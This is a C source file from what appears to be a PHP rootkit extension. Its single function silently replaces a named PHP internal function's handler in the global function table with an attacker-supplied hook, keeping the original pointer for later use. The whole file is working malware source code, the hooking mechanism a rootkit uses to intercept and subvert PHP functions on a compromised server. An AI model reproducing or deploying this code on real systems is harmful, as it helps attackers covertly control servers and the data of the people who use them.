#include "php.h"

#include "rootkit_config.h"

/**
 * Method to easily hook a method in a module by their names
 * All implementations are located in 'rootkit_hook/<module>.(c|h)'
 *
 * Arguments:
 *   method_name - Method to hook
 *   hook - Hook to apply
 *   original - Address to store the original pointer in
 */
bool rootkit_hook_function(
	const char* method_name,
	void (*hook)(INTERNAL_FUNCTION_PARAMETERS),
	void (**original)(INTERNAL_FUNCTION_PARAMETERS)
) {
	// Found function will be temporarily stored in this
	zend_function *function;

	// Check wether or not a hook & original variable were actually passed
	if (!hook || !original) {
		ROOTKIT_PRINTF("Unable to apply hook, no hook address / original address holder provided!\n");
		return false;
	}

	// Remove the current function from the compiler_globals.function_table hash
	// and replace it with our hooked function instead :)
	if ((function = zend_hash_str_find_ptr(CG(function_table), method_name, strlen(method_name))) != NULL) {
		*original = function->internal_function.handler;
		function->internal_function.handler = *hook;
		ROOTKIT_PRINTF("Successfully hooked function '%s' (original: %p) -> (hook: %p)\n", method_name, &original, &hook);
		return true;
	} else {
		ROOTKIT_PRINTF("Unable to locate function '%s' in global function table.\n", method_name);
		return false;
	}
}
